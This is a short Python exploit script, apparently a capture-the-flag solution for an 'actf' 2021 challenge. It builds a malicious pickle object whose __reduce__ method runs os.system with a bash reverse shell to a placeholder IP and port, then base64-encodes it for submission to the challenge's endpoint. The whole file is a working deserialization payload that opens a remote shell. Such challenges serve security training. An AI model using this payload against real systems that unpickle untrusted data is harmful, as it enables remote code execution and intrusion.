import requests,pickle,builtins,os,base64

url = 'https://jar.2021.chall.actf.co/add'

class SerializedPickle(object):
    def __reduce__(self):
        return(os.system,('bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1"',))

print(base64.b64encode(pickle.dumps(SerializedPickle())))
